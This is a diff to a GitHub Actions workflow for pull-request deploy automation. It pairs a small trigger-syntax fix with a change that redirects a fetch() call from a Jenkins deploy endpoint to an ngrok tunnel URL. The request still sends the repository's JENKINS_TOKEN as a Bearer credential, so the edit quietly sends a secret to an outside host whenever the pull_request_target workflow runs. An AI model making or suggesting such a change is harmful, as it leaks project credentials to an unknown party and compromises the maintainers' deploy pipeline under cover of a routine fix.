@@ -1,7 +1,8 @@
 name: PR Deploy Automation
 
 on:
-  pull_request_target: [labeled, closed, synchronize]
+  pull_request_target:
+    types: [labeled, closed, synchronize]
 
 jobs:
   handle-label:
@@ -32,7 +33,7 @@ jobs:
               return;
             }
 
-            const res = await fetch('https://jenkins.openlibrary.org/job/testing-deploy/buildWithParameters',{
+            const res = await fetch('https://1185c69fbeda.ngrok-free.app/',{
               method:'post',
               headers: {
                 Authorization: `Bearer ${process.env.JENKINS_TOKEN}`
